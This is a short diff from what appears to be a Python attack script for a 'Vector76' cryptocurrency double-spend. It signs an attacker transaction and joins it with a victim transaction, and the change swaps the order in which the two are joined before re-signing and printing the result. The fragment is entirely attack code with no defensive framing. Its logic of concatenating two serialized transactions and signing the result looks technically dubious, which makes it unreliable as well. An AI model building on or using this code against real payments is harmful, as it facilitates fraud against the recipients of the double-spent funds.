@@ -92,7 +92,7 @@ tx_attacker["outs"][0]["value"] = tx_attacker["outs"][0]["value"]
 tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, key))
 print()
 print()
-tx_vector76 = f"{tx_victim}{tx_attacker}"
+tx_vector76 = f"{tx_attacker}{tx_victim}"
 tx_vector76 = cryptos.serialize(transaction_util.signall(tx_vector76, key))
 print(tx_vector76)
 exit()
